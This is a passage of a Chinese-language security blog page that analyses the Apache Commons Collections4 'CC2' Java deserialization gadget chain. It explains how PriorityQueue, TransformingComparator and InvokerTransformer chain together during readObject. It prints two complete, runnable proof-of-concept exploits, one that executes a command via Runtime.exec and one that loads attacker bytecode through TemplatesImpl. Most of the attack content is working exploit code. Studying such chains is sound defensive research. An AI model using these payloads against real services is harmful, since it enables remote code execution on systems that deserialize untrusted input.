+</span></span><span style="display:flex;"><span>Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> { 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>), 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,  <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }),
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { Object.<span style="color:#a6e22e">class</span>, Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> { <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> }), 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> { String.<span style="color:#a6e22e">class</span> }, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;calc.exe&#34;</span> }),
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(fakeTransformers);
+</span></span></code></pre></div><p>再创建一个<code>TransformingComparator</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Comparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(transformerChain);
+</span></span></code></pre></div><p>然后我们需要实例化<code>PriorityQueue</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">PriorityQueue</span>(<span style="color:#66d9ef">int</span> initialCapacity,
+</span></span><span style="display:flex;"><span>                         Comparator<span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">super</span> E<span style="color:#f92672">&gt;</span> comparator) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Note: This restriction of at least one is not actually needed,</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// but continues for 1.5 compatibility</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (initialCapacity <span style="color:#f92672">&lt;</span> 1)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">queue</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>initialCapacity<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">comparator</span> <span style="color:#f92672">=</span> comparator;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>第一个参数是初始化的大小，至少要两个才能触发<code>排序</code>和<code>比较</code>，所以填入2，第二个参数是<code>Comparator</code>传入之前创建的comparator</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(2, comparator); 
+</span></span><span style="display:flex;"><span>queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>queue.<span style="color:#a6e22e">add</span>(2);
+</span></span></code></pre></div><p>后⾯随便添加了2个数字进去，这⾥可以传⼊⾮null的任意对象，因为我们的Transformer是忽略传⼊参 数的。</p>
+<p>最后，将真正的恶意Transformer设置上：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>setFieldValue(transformerChain, <span style="color:#e6db74">&#34;iTransformers&#34;</span>, transformers);
+</span></span></code></pre></div><p>完整POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Comparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">cc2</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> fakeTransformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{ <span style="color:#66d9ef">new</span> ConstantTransformer(1)};
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>, Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,
+</span></span><span style="display:flex;"><span>                        Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>}), <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>}, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc.exe&#34;</span>}),};
+</span></span><span style="display:flex;"><span>        Transformer transformerChain <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(fakeTransformers);
+</span></span><span style="display:flex;"><span>        Comparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(transformerChain);
+</span></span><span style="display:flex;"><span>        PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(2, comparator);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(1);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(2);
+</span></span><span style="display:flex;"><span>        setFieldValue(transformerChain, <span style="color:#e6db74">&#34;iTransformers&#34;</span>, transformers);
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(queue);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(barr);
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> ByteArrayInputStream(barr.<span style="color:#a6e22e">toByteArray</span>()));
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> (Object) ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="cc2与templatesimpl">CC2与TemplatesImpl</h2>
+<p>前面说了Shiro这里不能有数组，所以这里我们再试试用TemplatesImpl来构造POC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections4.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Comparator;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.PriorityQueue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">cc2pro</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldName, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldName);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj, value);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass clazzz <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;EvilTest&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> clazzz.<span style="color:#a6e22e">toBytecode</span>();
+</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{code});
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 无害transformer防止构造时触发</span>
+</span></span><span style="display:flex;"><span>        Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;toString&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>        Comparator comparator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TransformingComparator(transformer);
+</span></span><span style="display:flex;"><span>        PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(2,comparator);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(obj);
+</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(obj);
+</span></span><span style="display:flex;"><span>        setFieldValue(transformer, <span style="color:#e6db74">&#34;iMethodName&#34;</span>, <span style="color:#e6db74">&#34;newTransformer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream barr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(barr);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(queue);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(barr);
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> ByteArrayInputStream(barr.<span style="color:#a6e22e">toByteArray</span>()));
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> (Object)ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>首先创建一个<code>TemplatesImpl</code>对象<code>obj</code></p>
+<ul>
+<li>使用反射的方式设置<code>_bytecodes</code>，内容是恶意的字节码数组，</li>
+<li>设置<code>_name</code>代表字节码反序列化文件的名字为<code>HelloTemplatesImpl</code></li>
+<li><code>_tfactory</code>设置为<code>TransformerFactoryImpl</code>对象，防止为<code>null</code>返回导致不成功</li>
+</ul>
+<p>然后创建一个<code>InvokerTransformer</code>对象，调用方法本来需要调用<code>newTransformer()</code>方法，但是先传入<code>toString()</code>，防止干扰</p>
+<p>然后需要找一个类去调用<code>InvokerTransformer#transform()</code>方法，我们可以找到<code>TransformingComparator</code>类，<code>TransformingComparator#compare()</code>方法可以调用<code>transform()</code>方法，并且可以控制形参</p>
+<p>如何调用<code>TransformingComparator#compare()</code>方法，可以追溯到<code>PriorityQueue#readObjct()</code>方法</p>
+<p>这个方法很重要，会根据<code>PriorityQueue</code>传入形参的大小形成相应大小的队列</p>
+<p>从<code>readObject()</code>方法可以形成一个调用链（queue的值很关键）</p>
+<!-- raw HTML omitted -->
+<p>我们首先需要创建一个<code>PriorityQueue</code>对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// `2`代表队列大小为2</span>
+</span></span><span style="display:flex;"><span>PriorityQueue queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue(2, comparator);
+</span></span></code></pre></div><p>然后需要往队列里面添加两个值，这一次添加的值很重要，不能随便添加</p>
+<p>（<code>Comparator#compare()</code>方法调用<code>transform()</code>方法需要传入<code>TemplatesImpl</code>对象）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>queue.<span style="color:#a6e22e">add</span>(obj);
+</span></span><span style="display:flex;"><span>queue.<span style="color:#a6e22e">add</span>(obj);
+</span></span></code></pre></div><p>我们分析一下<code>PriorityQueue#add()</code>方法的执行过程：</p>
+<!-- raw HTML omitted -->
+<p>到这里我们就可以理解为什么之前要将<code>InvokerTransform</code>中方法换为<code>toString()</code>了，威为的是防止提前触发<code>compare()</code>方法</p>
+<p>在<code>add()</code>之后，我们将<code>InvokerTransformer</code>的<code>iMethodName</code>从<code>toString</code>改为<code>newTransformer</code>就大功告成了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PriorityQueue<span style="color:#960050;background-color:#1e0010">#</span>readObject()
+</span></span><span style="display:flex;"><span>    heapify()
+</span></span><span style="display:flex;"><span>        siftDown()
+</span></span><span style="display:flex;"><span>            siftDownUsingComparator()
+</span></span><span style="display:flex;"><span>                Comparator<span style="color:#960050;background-color:#1e0010">#</span>compare()
+</span></span><span style="display:flex;"><span>                    InvokerTransformer<span style="color:#960050;background-color:#1e0010">#</span>transform()
+</span></span><span style="display:flex;"><span>                        ...
+</span></span></code></pre></div><p>参考：</p>
+<p>java安全漫谈</p>
+<p><a href="http://leekos.fun/index.php/archives/216/#cl-5" target="_blank" rel="noopener noreffer">http://leekos.fun/index.php/archives/216/#cl-5</a>
+</p>
+<p><a href="https://blog.huamang.xyz/post/cc4/" target="_blank" rel="noopener noreffer">https://blog.huamang.xyz/post/cc4/</a>
+</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" data-title="java安全 CC2链" data-hashtags="java"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" data-title="java安全 CC2链"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" data-title="java安全 CC2链"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" data-title="java安全 CC2链"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" class="prev" rel="prev" title="java安全 Shiro反序列化利用CC链"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>java安全 Shiro反序列化利用CC链</a>
+            <a href="/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cb1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" class="next" rel="next" title="java安全 CB1利用链分析">java安全 CB1利用链分析<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
